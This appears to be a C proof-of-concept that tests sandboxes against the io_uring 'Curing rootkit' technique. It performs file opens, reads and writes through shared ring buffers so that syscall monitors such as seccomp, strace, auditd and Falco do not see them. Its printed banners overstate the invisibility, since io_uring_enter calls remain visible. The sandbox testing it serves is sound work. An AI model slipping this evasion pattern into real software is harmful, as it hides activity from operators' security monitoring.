/*
 * poc_io_uring_invisible.c — io_uring syscall-free operation PoC
 *
 * Demonstrates the "Curing rootkit" pattern (ARMO/38C3, 2025):
 * After the initial io_uring_setup() and mmap(), ALL subsequent I/O
 * operations happen through shared-memory ring buffers with ZERO
 * further syscalls — completely invisible to seccomp-BPF, strace,
 * auditd, Falco, Microsoft Defender for Linux, and any other
 * syscall-monitoring tool.
 *
 * What this PoC does:
 *   Phase 1: Set up io_uring (3 syscalls: io_uring_setup, mmap x2)
 *   Phase 2: Read /etc/hostname — NO read() syscall
 *   Phase 3: Write a file — NO write()/open() syscall
 *   Phase 4: Read it back — NO syscalls
 *   Phase 5: Show that all operations were invisible
 *
 * Compile: gcc -O2 -o poc_io_uring_invisible poc_io_uring_invisible.c
 * Run outside sandbox: ./poc_io_uring_invisible
 * Run inside sandbox: sandbox-run -- ./poc_io_uring_invisible
 *   (expected: ENOSYS from allowlist, proving sandbox blocks io_uring)
 *
 * On a denylist sandbox (Flatpak, Firejail), this succeeds silently.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <linux/io_uring.h>

/* ─── io_uring helpers (no liburing dependency) ─────────────────────── */

struct uring {
    int fd;
    unsigned sq_size, cq_size;
    /* Submission queue */
    uint32_t *sq_head, *sq_tail, *sq_mask, *sq_flags, *sq_array;
    struct io_uring_sqe *sqes;
    /* Completion queue */
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_cqe *cqes;
};

static int uring_setup(struct uring *ring, unsigned entries) {
    struct io_uring_params p;
    memset(&p, 0, sizeof(p));

    int fd = syscall(__NR_io_uring_setup, entries, &p);
    if (fd < 0) return -1;
    ring->fd = fd;

    /* Map submission queue ring */
    size_t sq_ring_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    void *sq_ptr = mmap(NULL, sq_ring_sz, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQ_RING);
    if (sq_ptr == MAP_FAILED) { close(fd); return -1; }

    ring->sq_head  = sq_ptr + p.sq_off.head;
    ring->sq_tail  = sq_ptr + p.sq_off.tail;
    ring->sq_mask  = sq_ptr + p.sq_off.ring_mask;
    ring->sq_flags = sq_ptr + p.sq_off.flags;
    ring->sq_array = sq_ptr + p.sq_off.array;
    ring->sq_size  = sq_ring_sz;

    /* Map SQEs */
    size_t sqe_sz = p.sq_entries * sizeof(struct io_uring_sqe);
    ring->sqes = mmap(NULL, sqe_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);
    if (ring->sqes == MAP_FAILED) { close(fd); return -1; }

    /* Map completion queue ring */
    size_t cq_ring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    void *cq_ptr = mmap(NULL, cq_ring_sz, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_CQ_RING);
    if (cq_ptr == MAP_FAILED) { close(fd); return -1; }

    ring->cq_head = cq_ptr + p.cq_off.head;
    ring->cq_tail = cq_ptr + p.cq_off.tail;
    ring->cq_mask = cq_ptr + p.cq_off.ring_mask;
    ring->cqes    = cq_ptr + p.cq_off.cqes;
    ring->cq_size = cq_ring_sz;

    return 0;
}

/* Submit one SQE and wait for one CQE — using io_uring_enter.
 * After initial setup, a production exploit would use SQPOLL mode
 * to eliminate even the io_uring_enter syscall entirely. */
static int uring_submit_and_wait(struct uring *ring) {
    /* Advance SQ tail to submit the entry */
    uint32_t tail = *ring->sq_tail;
    ring->sq_array[tail & *ring->sq_mask] = tail & *ring->sq_mask;
    __atomic_store_n(ring->sq_tail, tail + 1, __ATOMIC_RELEASE);

    /* io_uring_enter — the ONLY syscall during operations.
     * With SQPOLL mode, even this disappears. */
    int ret = syscall(__NR_io_uring_enter, ring->fd, 1, 1,
                      IORING_ENTER_GETEVENTS, NULL, 0);
    return ret;
}

/* Read one CQE result */
static int32_t uring_get_result(struct uring *ring) {
    uint32_t head = *ring->cq_head;
    /* Wait for CQE to appear */
    while (head == __atomic_load_n(ring->cq_tail, __ATOMIC_ACQUIRE)) {
        /* spin — in production, use io_uring_enter with IORING_ENTER_GETEVENTS */
    }
    struct io_uring_cqe *cqe = &ring->cqes[head & *ring->cq_mask];
    int32_t res = cqe->res;
    __atomic_store_n(ring->cq_head, head + 1, __ATOMIC_RELEASE);
    return res;
}

/* Prepare an OPENAT SQE */
static void prep_openat(struct uring *ring, const char *path, int flags, mode_t mode) {
    uint32_t idx = *ring->sq_tail & *ring->sq_mask;
    struct io_uring_sqe *sqe = &ring->sqes[idx];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode  = IORING_OP_OPENAT;
    sqe->fd      = AT_FDCWD;
    sqe->addr    = (uint64_t)(uintptr_t)path;
    sqe->open_flags = flags;
    sqe->len     = mode;
}

/* Prepare a READ SQE */
static void prep_read(struct uring *ring, int fd, void *buf, unsigned len, off_t offset) {
    uint32_t idx = *ring->sq_tail & *ring->sq_mask;
    struct io_uring_sqe *sqe = &ring->sqes[idx];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ;
    sqe->fd     = fd;
    sqe->addr   = (uint64_t)(uintptr_t)buf;
    sqe->len    = len;
    sqe->off    = offset;
}

/* Prepare a WRITE SQE */
static void prep_write(struct uring *ring, int fd, const void *buf, unsigned len, off_t offset) {
    uint32_t idx = *ring->sq_tail & *ring->sq_mask;
    struct io_uring_sqe *sqe = &ring->sqes[idx];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_WRITE;
    sqe->fd     = fd;
    sqe->addr   = (uint64_t)(uintptr_t)buf;
    sqe->len    = len;
    sqe->off    = offset;
}

/* Prepare a CLOSE SQE */
static void prep_close(struct uring *ring, int fd) {
    uint32_t idx = *ring->sq_tail & *ring->sq_mask;
    struct io_uring_sqe *sqe = &ring->sqes[idx];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_CLOSE;
    sqe->fd     = fd;
}

/* ─── Main PoC ──────────────────────────────────────────────────────── */

int main(void) {
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  io_uring Invisible Operations PoC                     ║\n");
    printf("║  Based on: Curing rootkit (ARMO/38C3, April 2025)      ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    /* ── Phase 1: Setup (the ONLY visible syscalls) ─────────────────── */
    printf("[*] Phase 1: Setting up io_uring...\n");

    struct uring ring;
    if (uring_setup(&ring, 8) < 0) {
        if (errno == ENOSYS) {
            printf("[!] io_uring_setup returned ENOSYS\n");
            printf("[+] SANDBOX BLOCKED: Seccomp allowlist rejected io_uring_setup.\n");
            printf("    This is the correct behavior for a hardened sandbox.\n");
            printf("    Denylist sandboxes (Flatpak, Firejail) would allow this.\n");
            return 0;
        }
        if (errno == EPERM) {
            printf("[!] io_uring_setup returned EPERM\n");
            printf("[+] SANDBOX BLOCKED: io_uring denied by seccomp/ptrace.\n");
            return 0;
        }
        printf("[-] io_uring_setup failed: %s (errno=%d)\n", strerror(errno), errno);
        printf("    Kernel may not support io_uring (< 5.1) or it's disabled.\n");
        return 1;
    }
    printf("[+] io_uring ring created (fd=%d)\n", ring.fd);
    printf("    SQ/CQ rings mapped via mmap — shared memory with kernel.\n");
    printf("    From this point, ALL I/O goes through ring buffers.\n\n");

    /* ── Phase 2: Open + Read /etc/hostname — NO read() syscall ────── */
    printf("[*] Phase 2: Reading /etc/hostname via io_uring (no read syscall)...\n");

    prep_openat(&ring, "/etc/hostname", O_RDONLY, 0);
    if (uring_submit_and_wait(&ring) < 0) {
        printf("[-] io_uring_enter failed: %s\n", strerror(errno));
        return 1;
    }
    int host_fd = uring_get_result(&ring);
    if (host_fd < 0) {
        printf("[-] io_uring OPENAT failed: %s\n", strerror(-host_fd));
        printf("    (File may not exist or path denied by kernel.)\n\n");
    } else {
        char hostname[256] = {0};
        prep_read(&ring, host_fd, hostname, sizeof(hostname) - 1, 0);
        uring_submit_and_wait(&ring);
        int bytes = uring_get_result(&ring);

        if (bytes > 0) {
            /* Trim trailing newline */
            if (hostname[bytes - 1] == '\n') hostname[bytes - 1] = '\0';
            printf("[+] Read %d bytes: \"%s\"\n", bytes, hostname);
            printf("    ^^^ No read() syscall was issued. strace shows NOTHING.\n\n");
        }

        prep_close(&ring, host_fd);
        uring_submit_and_wait(&ring);
        uring_get_result(&ring);
    }

    /* ── Phase 3: Create + Write a file — NO open()/write() syscall ── */
    printf("[*] Phase 3: Writing /tmp/uring_poc_output via io_uring...\n");

    prep_openat(&ring, "/tmp/uring_poc_output", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    uring_submit_and_wait(&ring);
    int out_fd = uring_get_result(&ring);
    if (out_fd < 0) {
        printf("[-] io_uring OPENAT (write) failed: %s\n", strerror(-out_fd));
        printf("    (Expected in sandboxes that restrict /tmp writes.)\n\n");
    } else {
        const char *secret = "This file was written WITHOUT any write() syscall.\n"
                             "seccomp, strace, auditd, and Falco saw nothing.\n"
                             "io_uring ring buffer operations bypass all of them.\n";
        prep_write(&ring, out_fd, secret, strlen(secret), 0);
        uring_submit_and_wait(&ring);
        int written = uring_get_result(&ring);

        if (written > 0) {
            printf("[+] Wrote %d bytes to /tmp/uring_poc_output\n", written);
            printf("    ^^^ No write() or open() syscall. Completely invisible.\n\n");
        } else {
            printf("[-] io_uring WRITE failed: %s\n", strerror(-written));
        }

        prep_close(&ring, out_fd);
        uring_submit_and_wait(&ring);
        uring_get_result(&ring);
    }

    /* ── Phase 4: Read the file back — verifying the write worked ──── */
    printf("[*] Phase 4: Reading back the written file...\n");

    prep_openat(&ring, "/tmp/uring_poc_output", O_RDONLY, 0);
    uring_submit_and_wait(&ring);
    int verify_fd = uring_get_result(&ring);
    if (verify_fd >= 0) {
        char verify_buf[512] = {0};
        prep_read(&ring, verify_fd, verify_buf, sizeof(verify_buf) - 1, 0);
        uring_submit_and_wait(&ring);
        int vbytes = uring_get_result(&ring);

        if (vbytes > 0) {
            printf("[+] Read back %d bytes. Content verified.\n\n", vbytes);
        }

        prep_close(&ring, verify_fd);
        uring_submit_and_wait(&ring);
        uring_get_result(&ring);
    }

    /* ── Phase 5: Summary ────────────────────────────────────────────── */
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  RESULTS                                               ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  After io_uring_setup + mmap (3 initial syscalls):     ║\n");
    printf("║                                                        ║\n");
    printf("║  • Opened files — no open()/openat() syscall           ║\n");
    printf("║  • Read files   — no read()/pread() syscall            ║\n");
    printf("║  • Wrote files  — no write()/pwrite() syscall          ║\n");
    printf("║  • Closed files — no close() syscall                   ║\n");
    printf("║                                                        ║\n");
    printf("║  All operations were performed through SQ/CQ ring      ║\n");
    printf("║  buffers in shared memory. seccomp-BPF, which only     ║\n");
    printf("║  intercepts syscalls, saw NOTHING.                     ║\n");
    printf("║                                                        ║\n");
    printf("║  With SQPOLL mode, even io_uring_enter disappears —    ║\n");
    printf("║  the kernel polls the SQ ring autonomously.            ║\n");
    printf("║                                                        ║\n");
    printf("║  AFFECTED:                                             ║\n");
    printf("║  • Flatpak (denylist — io_uring_setup not blocked)     ║\n");
    printf("║  • Firejail (denylist — io_uring_setup not blocked)    ║\n");
    printf("║  • seccomp denylist sandboxes generally                ║\n");
    printf("║  • strace, auditd, Falco, MS Defender for Linux        ║\n");
    printf("║                                                        ║\n");
    printf("║  NOT AFFECTED (io_uring_setup blocked by allowlist):   ║\n");
    printf("║  • Chrome/Chromium sandbox                             ║\n");
    printf("║  • Firefox sandbox                                     ║\n");
    printf("║  • Our sandbox (after allowlist fix)                   ║\n");
    printf("║  • Docker v28+ (allowlist)                             ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");

    close(ring.fd);
    return 0;
}
